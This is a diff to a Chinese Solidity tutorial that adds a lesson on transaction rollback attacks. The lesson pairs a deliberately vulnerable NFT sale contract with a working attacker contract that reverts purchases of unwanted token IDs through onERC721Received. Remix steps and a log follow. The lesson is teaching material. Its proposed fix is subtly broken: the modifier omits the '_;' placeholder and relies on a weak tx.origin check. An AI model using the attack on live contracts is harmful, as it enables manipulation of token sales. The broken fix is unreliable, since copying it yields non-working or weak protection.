@@ -190,10 +190,8 @@ constant、view、pure三个函数修饰词的作用是告诉编译器，`函数
 一个函数要进行货币操作必须要带上`payable`关键字。  
 
 
-### 实例
-
-
-
+### 示例
+- ### [solidity-by-example](https://solidity-by-example.org/)
 #### Constants
 
 Constants are variables that cannot be modified.
@@ -1388,7 +1386,104 @@ contract C {
 }
 ```
 
+### 交易回滚  
 
+这里通过分析`交易回滚攻击`来学些交易回滚的知识  
+
+- 原理分析
+以太坊 EVM 支持交易回滚，合约可以使不满足条件的调用失败，从而回滚部分或者整个交易。
+
+- 交易回滚
+使用 `assert()`，`require()` 和 `revert()` 可以使不满足条件的调用失败，配合 `try`，`catch` 可以回滚部分或者整个交易。
+
+- 回滚攻击
+如果业务合约允许合约调用或者调用了第三方合约，那么合约调用和第三方合约就可以利用交易回滚，撤销不符合自己期望的执行结果，从而达成攻击的目的。
+
+示例
+
+这是一个简单的 NFT 合约示例，它的功能是购买 NFT。如果你看不出合约的问题，说明你正需要学习这节课。(这个合约有巨大漏洞，请不要直接使用在任何实际业务中)  
+
+```js
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity ^0.8.12;
+
+import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
+
+interface INFT {
+    function buyNFT() external payable;
+}
+
+contract NFT is ERC721 {
+    uint256 tokenId;
+
+    constructor() ERC721("NFT","NFT") {}
+
+    function buyNFT() external payable {
+        require(msg.value >= 1 ether, "NFT: You must pay 1 ether to buy an NFT");
+        _safeMint(msg.sender, tokenId++);
+    }
+}
+
+contract TransactionRollbackAttack {
+    INFT nft;
+    uint256 tokenId;
+
+    constructor(address _nft) {
+        nft = INFT(_nft);
+    }
+
+    function doBuyNFT(uint256 _tokenId) external payable {
+        tokenId = _tokenId;
+        nft.buyNFT{value: msg.value}();
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 _tokenId,
+        bytes calldata data
+    ) external returns (bytes4) {
+        require(tokenId == _tokenId, "NFT: not the correct token");
+        return this.onERC721Received.selector;
+    }
+}
+```
+
+- TransactionRollbackAttack 部署时，把NFT作为构造函数参数  
+- 选择向合约发送 1 ETH，点击 `TransactionRollbackAttack`的`doBuyNFT`方法，参数输入`0`,点击`transact`,看日志是成功购买 `tokenId` 为 `0` 的 NFT。  
+- 选择向合约发送 1 ETH，点击 `TransactionRollbackAttack` 合约的 `doBuyNFT` 方法，参数输入 0，购买 tokenId 为 0 的 NFT 失败
+
+购买tokenId=0的NFT成功日志  
+```sh
+[
+	{
+		"from": "0xd9145CCE52D386f254917e481eB44e9943F39138",
+		"topic": "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
+		"event": "Transfer",
+		"args": {
+			"0": "0x0000000000000000000000000000000000000000",
+			"1": "0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8",
+			"2": "0",
+			"from": "0x0000000000000000000000000000000000000000",
+			"to": "0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8",
+			"tokenId": "0"
+		}
+	}
+]
+```
+
+
+修复问题-`禁止合约调用`  
+```js
+modifier noContract() {
+    require(tx.origin == msg.sender, "NFT: not contract");
+}
+
+function buyNFT() noContract external payable {
+    require(msg.value >= 1 ether, "NFT: You must pay 1 ether to buy an NFT");
+    _safeMint(msg.sender, tokenId++);
+}
+```
 
 
 
